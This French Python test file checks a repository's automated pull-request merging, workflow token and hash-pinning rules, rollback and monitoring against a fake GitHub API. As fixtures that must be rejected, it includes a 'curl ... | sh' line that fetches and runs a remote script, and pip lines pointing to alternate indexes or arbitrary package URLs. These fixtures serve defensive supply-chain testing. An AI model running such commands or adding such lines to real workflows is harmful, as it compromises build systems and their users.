"""La maintenance automatique : fusion des pull requests, veille, garde-fous.

Tout se joue hors ligne : l'API de GitHub est simulee par `ApiFactice`, qui
repond d'apres un dictionnaire et note chaque ecriture.
"""

from __future__ import annotations

import datetime as dt
import sys
from pathlib import Path

import pandas as pd

RACINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RACINE))
sys.path.insert(0, str(RACINE / "scripts"))

import fusion_auto  # noqa: E402
import resumer_mise_a_jour  # noqa: E402
import veiller  # noqa: E402
from github_api import ErreurApi  # noqa: E402

DEPOT = "moi/site"


class ApiFactice:
    depot = DEPOT

    def __init__(self, reponses: dict[str, object], refus: dict[str, ErreurApi] | None = None):
        self.reponses = reponses
        self.refus = refus or {}
        self.ecritures: list[tuple[str, str, dict | None]] = []

    def chemin(self, suite: str = "") -> str:
        return f"/repos/{DEPOT}{suite}"

    def get(self, chemin: str):
        for debut, reponse in self.reponses.items():
            if chemin.startswith(debut):
                return reponse
        raise AssertionError(f"lecture imprevue : {chemin}")

    def appeler(self, methode: str, chemin: str, donnees=None):
        if methode == "GET":
            return 200, {}, self.get(chemin)
        if chemin in self.refus:
            raise self.refus[chemin]
        self.ecritures.append((methode, chemin, donnees))
        return 200, {}, None


def _pr(numero, branche, auteur="moi", etiquettes=(), depot=DEPOT, brouillon=False):
    return {
        "number": numero, "title": f"PR {numero}", "draft": brouillon,
        "user": {"login": auteur}, "labels": [{"name": e} for e in etiquettes],
        "head": {"ref": branche, "sha": f"sha{numero}", "repo": {"full_name": depot}},
        "html_url": f"https://github.com/{DEPOT}/pull/{numero}", "created_at": "2026-09-01T00:00:00Z",
    }


def _run(conclusion="success", statut="completed", tentative=1, evenement="pull_request", ident=1):
    return {"id": ident, "status": statut, "conclusion": conclusion, "run_attempt": tentative,
            "event": evenement, "created_at": "2026-09-02T00:00:00Z", "html_url": "https://ci"}


#: Ce que chaque famille de pull requests touche d'ordinaire.
FICHIERS_TYPES = {
    "dependabot/github_actions/": [{"filename": ".github/workflows/ci.yml", "patch": (
        "@@ -1,3 +1,3 @@\n-      - uses: actions/checkout@" + "a" * 40 + " # v4.4.0\n"
        "+      - uses: actions/checkout@" + "b" * 40 + " # v7.0.1\n")}],
    "dependabot/pip/": [
        {"filename": "requirements.in", "patch": (
            "@@ -9,1 +9,1 @@\n-pandas>=2.1,<3\n+pandas>=2.1,<4           # dataframes\n")},
        {"filename": "requirements.txt", "patch": (
            "@@ -40,6 +40,9 @@\n"
            "-pandas==2.3.3 \\\n"
            "-    --hash=sha256:" + "a" * 64 + " \\\n"
            "-    --hash=sha256:" + "b" * 64 + "\n"
            "+pandas==3.0.6 \\\n"
            "+    --hash=sha256:" + "c" * 64 + " \\\n"
            "+    --hash=sha256:" + "d" * 64 + "\n"
            "+    # via -r requirements.in\n"
            "+tzdata==2026.1 \\\n"
            "+    --hash=sha256:" + "e" * 64 + "\n")},
    ],
    "donnees/": [{"filename": "data/territoires/grand-paris/mutations.parquet"},
                 {"filename": "data/geo/75/75101.json"}],
    "reseau/": [{"filename": "data/geo/gares.json"}],
    "maintenance/python-": [{"filename": ".python-version", "patch": "-3.12\n+3.14"}],
}


def _fichiers(branche):
    return next((f for prefixe, f in FICHIERS_TYPES.items() if branche.startswith(prefixe)),
                [{"filename": "site/app.js"}])


def _api(prs, ci_par_sha, ci_main=(_run(evenement="push"),), refus=None, fichiers=None):
    reponses = {
        f"/repos/{DEPOT}/pulls": prs,
        f"/repos/{DEPOT}/actions/workflows/ci.yml/runs?per_page=10&branch=main": {"workflow_runs": list(ci_main)},
    }
    for sha, runs in ci_par_sha.items():
        reponses[f"/repos/{DEPOT}/actions/workflows/ci.yml/runs?per_page=20&head_sha={sha}"] = {"workflow_runs": runs}
    for pr in prs:
        reponses[f"/repos/{DEPOT}/pulls/{pr['number']}/files"] = (fichiers or {}).get(
            pr["number"], _fichiers(pr["head"]["ref"]))
    reponses[f"/repos/{DEPOT}"] = {"default_branch": "main"}
    # Le plus long prefixe d'abord : `/repos/moi/site` ne doit pas tout avaler.
    return ApiFactice(dict(sorted(reponses.items(), key=lambda kv: -len(kv[0]))), refus)


# --------------------------------------------------------------------------
# Quelles pull requests sont fusionnees d'office
# --------------------------------------------------------------------------


def test_chaque_automatisation_reste_dans_son_perimetre():
    for prefixe, fichiers in FICHIERS_TYPES.items():
        assert fusion_auto.hors_perimetre(prefixe + "x", fichiers) is None, prefixe

    # Des donnees qui toucheraient au site, aux tests ou a la CI attendent un humain.
    assert fusion_auto.hors_perimetre("donnees/x", [{"filename": "tests/test_pipeline.py"}]) == \
        "touche à tests/test_pipeline.py"
    assert fusion_auto.hors_perimetre("reseau/x", [{"filename": "data/geo/75/75101.json"}])
    assert fusion_auto.hors_perimetre("maintenance/python-3.14", [{"filename": ".github/workflows/ci.yml"}])
    assert fusion_auto.hors_perimetre("donnees/x", []) == "aucun fichier modifié"


def test_dependabot_ne_change_que_des_lignes_de_version():
    workflow = ".github/workflows/ci.yml"
    # Une etape ajoutee, une action non epinglee, une commande : refuse.
    for ligne in ("      - run: curl https://exemple.org/x.sh | sh",
                  "      - uses: actions/checkout@v7",
                  "          GH_TOKEN: ${{ secrets.JETON_MISE_A_JOUR }}"):
        motif = fusion_auto.hors_perimetre("dependabot/github_actions/a", [
            {"filename": workflow, "patch": "@@ -1 +1,2 @@\n+" + ligne}])
        assert motif and motif.startswith("ligne inattendue"), ligne
    # Une option de pip (un autre index de paquets, une adresse de paquet, une
    # empreinte mal formee) : refuse, dans les bornes comme dans le fichier fige.
    for ligne in ("--index-url https://exemple.org/simple", "-r autre.txt",
                  "pandas @ https://exemple.org/p.whl", "pandas==3.0 --extra-index-url https://x",
                  "    --hash=md5:0123", "-e git+https://exemple.org/p.git"):
        for nom in ("requirements.in", "requirements.txt"):
            assert fusion_auto.hors_perimetre("dependabot/pip/a", [
                {"filename": nom, "patch": "+" + ligne}]), (nom, ligne)
    # Une dependance directe qui entre (ou sort) attend un humain ; dans le
    # fichier fige, une dependance indirecte nouvelle est normale.
    assert fusion_auto.hors_perimetre("dependabot/pip/a", [
        {"filename": "requirements.in", "patch": "@@ -1 +1,2 @@\n pandas>=2.1,<4\n+paquet-inconnu>=1\n"}
    ]) == "dépendance ajoutée ou retirée dans requirements.in"
    assert fusion_auto.hors_perimetre("dependabot/pip/a", [
        {"filename": "requirements-dev.in", "patch": "-pyflakes>=3,<4\n"}])
    assert fusion_auto.hors_perimetre("dependabot/pip/a", [
        {"filename": "requirements-dev.in", "patch": "-Pyflakes>=3,<4\n+pyflakes>=3,<5\n"}]) is None
    # Dependabot hors de ses fichiers, ou sans diff lisible : refuse.
    assert fusion_auto.hors_perimetre("dependabot/pip/a", [{"filename": "src/stats.py", "patch": "+x"}])
    assert fusion_auto.hors_perimetre("dependabot/pip/a", [{"filename": "requirements.txt"}])


# --------------------------------------------------------------------------
# Jetons et paquets dans les workflows
# --------------------------------------------------------------------------

WORKFLOWS = sorted((RACINE / ".github" / "workflows").glob("*.yml"))


def test_le_jeton_personnel_ne_sert_qu_aux_etapes_qui_parlent_a_github():
    """`JETON_MISE_A_JOUR` peut modifier les workflows : jamais dans
    l'environnement d'un job entier (il atteindrait `pip install` et les
    tests), jamais laisse dans `.git/config` par `actions/checkout`."""

    assert WORKFLOWS
    for chemin in WORKFLOWS:
        lignes = chemin.read_text(encoding="utf-8").splitlines()
        for numero, ligne in enumerate(lignes):
            if "secrets.JETON_MISE_A_JOUR" in ligne and not ligne.lstrip().startswith("#"):
                # Indentation d'une etape (`env:` d'un `- name:`), pas d'un job.
                retrait = len(ligne) - len(ligne.lstrip())
                assert retrait >= 10, f"{chemin.name}:{numero + 1} : jeton hors d'une étape"
                assert not ligne.lstrip().startswith("token:"), \
                    f"{chemin.name}:{numero + 1} : jeton passé à une action"
            if "uses: actions/checkout@" in ligne:
                suite = "\n".join(lignes[numero + 1:numero + 4])
                assert "persist-credentials: false" in suite, \
                    f"{chemin.name}:{numero + 1} : checkout qui garde son jeton"


def test_les_workflows_n_installent_que_des_paquets_figes():
    for chemin in WORKFLOWS:
        for ligne in chemin.read_text(encoding="utf-8").splitlines():
            if "pip install" in ligne and not ligne.lstrip().startswith("#"):
                assert "--require-hashes" in ligne and "--only-binary :all:" in ligne, \
                    f"{chemin.name} : {ligne.strip()}"
                assert ligne.rstrip().endswith(("requirements.txt", "requirements-dev.txt")), ligne

    # Chaque paquet du fichier fige porte sa version exacte et son empreinte.
    for nom in ("requirements.txt", "requirements-dev.txt"):
        texte = (RACINE / nom).read_text(encoding="utf-8")
        paquets = [l for l in texte.splitlines() if l[:1].isalnum()]
        assert paquets, nom
        for ligne in paquets:
            assert "==" in ligne and ligne.endswith("\\"), f"{nom} : {ligne}"
        assert texte.count("--hash=sha256:") >= len(paquets), nom
    # Le fichier de developpement reprend les versions de l'execution.
    figees = {
        l.split(" ")[0] for l in (RACINE / "requirements.txt").read_text(encoding="utf-8").splitlines()
        if l[:1].isalnum()
    }
    dev = {
        l.split(" ")[0] for l in (RACINE / "requirements-dev.txt").read_text(encoding="utf-8").splitlines()
        if l[:1].isalnum()
    }
    assert figees <= dev, figees - dev


def test_une_pull_request_hors_perimetre_n_est_pas_fusionnee():
    api = _api([_pr(2, "donnees/x")], {"sha2": [_run()]},
               fichiers={2: [{"filename": "data/geo/gares.json"}, {"filename": ".github/workflows/ci.yml"}]})
    journal = []
    assert fusion_auto.balayer(api, api, journal=journal.append) is None
    assert api.ecritures == [] and "touche à .github/workflows/ci.yml" in " ".join(journal)


def test_dependabot_attend_sept_jours_de_quarantaine():
    pr = dict(_pr(2, "dependabot/pip/a", "dependabot[bot]"), created_at="2026-09-28T00:00:00Z")
    api = _api([pr], {"sha2": [_run()]})
    maintenant = dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc)
    assert fusion_auto.balayer(api, api, journal=lambda _: None, maintenant=maintenant) is None
    assert api.ecritures == []
    plus_tard = dt.datetime(2026, 10, 5, tzinfo=dt.timezone.utc)
    assert fusion_auto.balayer(api, api, journal=lambda _: None, maintenant=plus_tard) == 2
    # Les mises a jour du depot lui-meme (donnees, gares) n'attendent pas.
    api = _api([dict(_pr(3, "donnees/x"), created_at="2026-09-30T23:00:00Z")], {"sha3": [_run()]})
    assert fusion_auto.balayer(api, api, journal=lambda _: None, maintenant=maintenant) == 3


def test_seules_les_pull_requests_automatiques_sont_fusionnees_d_office():
    assert fusion_auto.motif_de_refus(_pr(1, "dependabot/pip/pandas", "dependabot[bot]"), DEPOT) is None
    assert fusion_auto.motif_de_refus(_pr(2, "donnees/2026-06-abcd"), DEPOT) is None
    assert fusion_auto.motif_de_refus(_pr(3, "reseau/2026-10-abcd", "github-actions[bot]"), DEPOT) is None
    assert fusion_auto.motif_de_refus(_pr(4, "maintenance/python-3.14"), DEPOT) is None

    assert fusion_auto.motif_de_refus(_pr(5, "claude/une-idee"), DEPOT) == "pull request faite à la main"
    assert "Dependabot" in fusion_auto.motif_de_refus(_pr(6, "dependabot/pip/x", "quelquun"), DEPOT)
    assert fusion_auto.motif_de_refus(_pr(7, "donnees/x", depot="autre/fork"), DEPOT) == "branche hors du dépôt"
    assert fusion_auto.motif_de_refus(_pr(8, "donnees/x", brouillon=True), DEPOT) == "brouillon"
    assert fusion_auto.motif_de_refus(_pr(9, "donnees/x", etiquettes=["a-verifier"]), DEPOT) == "étiquette a-verifier"


def test_une_seule_fusion_par_passage_la_plus_ancienne_d_abord():
    api = _api(
        [_pr(1, "claude/a-la-main"), _pr(2, "dependabot/pip/a", "dependabot[bot]"),
         _pr(3, "dependabot/pip/b", "dependabot[bot]")],
        {"sha1": [_run()], "sha2": [_run()], "sha3": [_run()]},
    )
    assert fusion_auto.balayer(api, api, journal=lambda _: None) == 2
    methodes = [(m, c) for m, c, _ in api.ecritures]
    assert methodes == [
        ("PUT", f"/repos/{DEPOT}/pulls/2/merge"),
        ("DELETE", f"/repos/{DEPOT}/git/refs/heads/dependabot/pip/a"),
    ]
    assert api.ecritures[0][2]["sha"] == "sha2", "la fusion porte sur le commit teste, pas un plus recent"


def test_un_main_rouge_ou_en_cours_retient_toute_fusion():
    for ci_main in ([_run("failure", evenement="push")], [_run(None, "in_progress", evenement="push")]):
        api = _api([_pr(2, "donnees/x")], {"sha2": [_run()]}, ci_main=ci_main)
        assert fusion_auto.balayer(api, api, journal=lambda _: None) is None
        assert api.ecritures == []


def test_une_ci_rouge_est_relancee_une_fois_puis_plus():
    api = _api([_pr(2, "reseau/x")], {"sha2": [_run("failure", ident=77)]})
    fusion_auto.balayer(api, api, journal=lambda _: None)
    assert api.ecritures == [("POST", f"/repos/{DEPOT}/actions/runs/77/rerun-failed-jobs", None)]

    api = _api([_pr(2, "reseau/x")], {"sha2": [_run("failure", tentative=2, ident=77)]})
    fusion_auto.balayer(api, api, journal=lambda _: None)
    assert api.ecritures == []


def test_sans_jeton_personnel_la_ci_est_lancee_a_la_main():
    # Une pull request ouverte avec le jeton par defaut n'a pas de CI : on la lance.
    api = _api([_pr(4, "maintenance/python-3.14")], {"sha4": []})
    fusion_auto.balayer(api, None, journal=lambda _: None)
    assert api.ecritures == [
        ("POST", f"/repos/{DEPOT}/actions/workflows/ci.yml/dispatches", {"ref": "maintenance/python-3.14"}),
    ]
    # Fusionnee avec ce meme jeton, `main` ne lancerait pas sa CI (ni le deploiement).
    api = _api([_pr(4, "maintenance/python-3.14")], {"sha4": [_run()]})
    fusion_auto.balayer(api, None, journal=lambda _: None)
    assert api.ecritures[-1] == ("POST", f"/repos/{DEPOT}/actions/workflows/ci.yml/dispatches", {"ref": "main"})


def test_le_jeton_personnel_ne_sert_qu_a_fusionner():
    api = _api([_pr(2, "reseau/x"), _pr(3, "donnees/y")],
               {"sha2": [_run()], "sha3": [_run("failure", ident=5)]})
    personnel = ApiFactice({})
    fusion_auto.balayer(api, personnel, journal=lambda _: None)
    assert [c for _, c, _ in personnel.ecritures] == [f"/repos/{DEPOT}/pulls/2/merge"]
    assert [c for _, c, _ in api.ecritures] == [
        f"/repos/{DEPOT}/git/refs/heads/reseau/x", f"/repos/{DEPOT}/actions/runs/5/rerun-failed-jobs",
    ]


def test_une_relance_refusee_n_arrete_pas_le_passage():
    refus = {f"/repos/{DEPOT}/actions/runs/5/rerun-failed-jobs": ErreurApi(403, "interdit")}
    api = _api([_pr(2, "reseau/x"), _pr(3, "donnees/y")],
               {"sha2": [_run("failure", ident=5)], "sha3": [_run()]}, refus=refus)
    journal = []
    assert fusion_auto.balayer(api, api, journal=journal.append) == 3
    assert any("échec" in ligne for ligne in journal)


def test_une_fusion_refusee_passe_a_la_suivante():
    refus = {f"/repos/{DEPOT}/pulls/2/merge": ErreurApi(405, "conflit")}
    api = _api([_pr(2, "dependabot/pip/a", "dependabot[bot]"), _pr(3, "dependabot/pip/b", "dependabot[bot]")],
               {"sha2": [_run()], "sha3": [_run()]}, refus=refus)
    assert fusion_auto.balayer(api, api, journal=lambda _: None) == 3


def test_la_simulation_n_ecrit_rien():
    api = _api([_pr(2, "donnees/x")], {"sha2": [_run()]})
    assert fusion_auto.balayer(api, simulation=True, journal=lambda _: None) is None
    assert api.ecritures == []


# --------------------------------------------------------------------------
# Retour a la version precedente
# --------------------------------------------------------------------------


def test_le_retour_vise_le_dernier_deploiement_de_production_sain():
    import retablir_production

    def deploiement(ident, quand, statut="success", environnement="production"):
        return {"id": ident, "created_on": quand, "environment": environnement,
                "latest_stage": {"status": statut}, "url": f"https://{ident}.site.pages.dev"}

    deploiements = [
        deploiement("rate", "2026-10-01T10:00"),  # celui qui vient d'echouer
        deploiement("controle", "2026-10-01T09:59", environnement="preview"),
        deploiement("echoue", "2026-09-20T10:00", statut="failure"),
        deploiement("sain", "2026-09-15T10:00"),
        deploiement("ancien", "2026-08-01T10:00"),
    ]
    cible = retablir_production.deploiement_sain(deploiements, "https://rate.site.pages.dev/")
    assert cible["id"] == "sain"
    assert retablir_production.deploiement_sain(deploiements[:1], "https://rate.site.pages.dev") is None


# --------------------------------------------------------------------------
# Veille
# --------------------------------------------------------------------------

JOUR = dt.date(2026, 9, 28)


def test_des_donnees_figees_depuis_plus_de_quinze_mois_sont_signalees():
    rapport = veiller.Rapport()
    veiller.verifier_fraicheur(rapport, {"periode": {"fin": "2025-12-31"}, "genere_le": "2026-09-27T10:05:21Z"}, JOUR)
    assert not rapport.problemes

    rapport = veiller.Rapport()
    veiller.verifier_fraicheur(rapport, {"periode": {"fin": "2025-06-30"}}, dt.date(2026, 10, 15))
    assert rapport.problemes and "30/06/2025" in rapport.problemes[0]


def test_une_pull_request_qui_traine_est_signalee():
    api = _api([_pr(9, "donnees/x"), dict(_pr(10, "reseau/y"), created_at="2026-09-20T00:00:00Z")], {})
    rapport = veiller.Rapport()
    veiller.verifier_pull_requests(rapport, api, dt.datetime(2026, 9, 28, tzinfo=dt.timezone.utc))
    assert len(rapport.problemes) == 1 and "#9" in rapport.problemes[0]


def test_un_main_rouge_est_signale():
    rapport = veiller.Rapport()
    veiller.verifier_ci(rapport, _api([], {}, ci_main=[_run("failure", evenement="push")]))
    assert rapport.problemes

    rapport = veiller.Rapport()
    veiller.verifier_ci(rapport, _api([], {}, ci_main=[
        _run(None, "in_progress", evenement="push"), _run("success", evenement="push")]))
    assert not rapport.problemes


def test_les_workflows_coupes_pour_inactivite_sont_reactives_pas_ceux_coupes_a_la_main():
    workflows = {"workflows": [
        {"id": 1, "name": "CI", "path": ".github/workflows/ci.yml", "state": "active"},
        {"id": 2, "name": "Gares", "path": ".github/workflows/reseau.yml", "state": "disabled_inactivity"},
        {"id": 3, "name": "Vieux", "path": ".github/workflows/vieux.yml", "state": "disabled_manually"},
        {"id": 4, "name": "Dependabot", "path": "dynamic/dependabot/dependabot-updates", "state": "active"},
    ]}
    api = ApiFactice({f"/repos/{DEPOT}/actions/workflows": workflows})
    rapport = veiller.Rapport()
    veiller.reactiver_workflows(rapport, api)
    assert [c for _, c, _ in api.ecritures] == [
        f"/repos/{DEPOT}/actions/workflows/1/enable", f"/repos/{DEPOT}/actions/workflows/2/enable",
    ]
    assert "réactivés : Gares" in rapport.constats[0]


def test_un_jeton_absent_ou_proche_de_l_expiration_est_signale(monkeypatch):
    rapport = veiller.Rapport()
    veiller.verifier_jeton(rapport, "", DEPOT, JOUR)
    assert "absent" in rapport.problemes[0]

    class Jeton:
        def __init__(self, jeton, depot):
            pass

        def appeler(self, methode, chemin):
            return 200, {"github-authentication-token-expiration": fin}, {}

    monkeypatch.setattr(veiller, "Api", Jeton)
    fin = "2026-10-10 12:00:00 UTC"
    rapport = veiller.Rapport()
    veiller.verifier_jeton(rapport, "x", DEPOT, JOUR)
    assert "expire le 10/10/2026" in rapport.problemes[0]

    fin = "2027-09-01 12:00:00 UTC"
    rapport = veiller.Rapport()
    veiller.verifier_jeton(rapport, "x", DEPOT, JOUR)
    assert not rapport.problemes


CYCLES = {
    "3.16": {"status": "feature", "first_release": "2027-10-01", "end_of_life": "2032-10"},
    "3.15": {"status": "bugfix", "first_release": "2026-10-01", "end_of_life": "2031-10"},
    "3.14": {"status": "bugfix", "first_release": "2025-10-07", "end_of_life": "2030-10"},
    "3.13": {"status": "security", "first_release": "2024-10-07", "end_of_life": "2029-10"},
    "3.12": {"status": "security", "first_release": "2023-10-02", "end_of_life": "2028-10"},
}


def test_python_monte_un_an_avant_sa_fin_de_vie_vers_une_version_eprouvee():
    assert veiller.python_cible(CYCLES, "3.12", JOUR) is None
    # Un an avant la fin de vie de 3.12 : la plus recente des versions sorties
    # depuis plus d'un an, pas celle qui vient de paraitre.
    assert veiller.python_cible(CYCLES, "3.12", dt.date(2027, 10, 15)) == "3.15"
    assert veiller.python_cible(CYCLES, "3.12", dt.date(2027, 9, 30)) is None
    # Rien de plus recent n'est disponible : on garde.
    assert veiller.python_cible({"3.12": CYCLES["3.12"]}, "3.12", dt.date(2028, 1, 1)) is None


def test_la_version_de_python_des_workflows_est_connue_de_la_veille():
    version = (RACINE / ".python-version").read_text(encoding="utf-8").strip()
    assert version.count(".") == 1 and all(n.isdigit() for n in version.split("."))


# --------------------------------------------------------------------------
# Garde-fous de la mise a jour des donnees
# --------------------------------------------------------------------------


def _ventes(annees, prix=5000, par_annee=100, communes=("75101", "92012", "93001", "94001", "95001")):
    lignes = []
    for annee in annees:
        for k in range(par_annee):
            lignes.append({
                "annee": annee, "code_commune": communes[k % len(communes)],
                "prix_m2": prix + (k % 7) * 10,
            })
    return pd.DataFrame(lignes)


def test_un_glissement_de_fenetre_ordinaire_ne_leve_aucun_garde_fou():
    anciennes = _ventes([2021, 2022, 2023, 2024, 2025])
    nouvelles = pd.concat([_ventes([2022, 2023, 2024, 2025]), _ventes([2026], prix=5600, par_annee=40)])
    assert resumer_mise_a_jour.garde_fous(anciennes, nouvelles, {}) == []


def test_les_garde_fous_retiennent_une_mise_a_jour_inhabituelle():
    anciennes = _ventes([2021, 2022, 2023, 2024, 2025])
    # Une annee amputee, des prix revises, des communes et des contours perdus.
    nouvelles = pd.concat([
        _ventes([2022, 2023], prix=5500, communes=("75101",)),
        _ventes([2025], prix=5500, par_annee=50, communes=("75101",)),
    ])
    alertes = resumer_mise_a_jour.garde_fous(anciennes, nouvelles, {"75101000A1": 10})
    texte = " / ".join(alertes)
    assert "ventes exploitables" in texte
    assert "ventes de 2025" in texte
    assert "prix médian du 75" in texte
    assert "4 communes disparues" in texte
    assert "sections sans contour" in texte

    description = resumer_mise_a_jour.resumer(
        anciennes.assign(date_mutation=pd.Timestamp(2021, 1, 1), nom_commune="C", code_section="S"),
        nouvelles.assign(date_mutation=pd.Timestamp(2022, 1, 1), nom_commune="C", code_section="S"),
        {"75101000A1": 10},
    )
    assert "Fusion automatique retenue" in description


# --------------------------------------------------------------------------
# MapLibre copie dans le depot, taille du depot, workflows analyses
# --------------------------------------------------------------------------


def test_une_faille_connue_de_maplibre_ouvre_une_issue():
    def lire(adresse, donnees=None):
        if adresse == veiller.URL_OSV:
            assert donnees["version"] == "4.7.1" and donnees["package"]["ecosystem"] == "npm"
            return {"vulns": [{"id": "GHSA-xxxx-yyyy-zzzz"}]}
        return {"version": "6.11.2"}

    rapport = veiller.Rapport()
    veiller.verifier_maplibre(rapport, lire, "4.7.1")
    assert rapport.problemes and "GHSA-xxxx-yyyy-zzzz" in rapport.problemes[0]


def test_une_version_plus_recente_de_maplibre_n_est_qu_une_information():
    rapport = veiller.Rapport()
    veiller.verifier_maplibre(rapport, lambda a, d=None: {} if a == veiller.URL_OSV else {"version": "6.11.2"},
                              "4.7.1")
    assert not rapport.problemes and "6.11.2" in rapport.constats[0]

    # La base OSV injoignable ne crie pas au loup : la semaine suivante reessaiera.
    def panne(adresse, donnees=None):
        raise OSError("réseau")

    rapport = veiller.Rapport()
    veiller.verifier_maplibre(rapport, panne, "4.7.1")
    assert not rapport.problemes and "injoignable" in rapport.constats[0]


def test_la_version_de_maplibre_se_lit_dans_sa_provenance():
    version = veiller.version_maplibre()
    assert version.count(".") == 2
    entete = (RACINE / "site" / "carte" / "vendor" / "maplibre-gl.js").read_text(encoding="utf-8")[:300]
    assert f"v{version}" in entete


def test_un_depot_trop_lourd_est_signale():
    rapport = veiller.Rapport()
    veiller.verifier_taille_depot(rapport, ApiFactice({f"/repos/{DEPOT}": {"size": 50_000}}))
    assert not rapport.problemes and "49 Mio" in rapport.constats[0]
    rapport = veiller.Rapport()
    veiller.verifier_taille_depot(rapport, ApiFactice({f"/repos/{DEPOT}": {"size": 900_000}}))
    assert rapport.problemes and "LFS" in rapport.problemes[0]


def test_la_ci_analyse_les_workflows_avec_un_binaire_verifie():
    ci = (RACINE / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
    assert "actionlint" in ci and "sha256sum -c" in ci
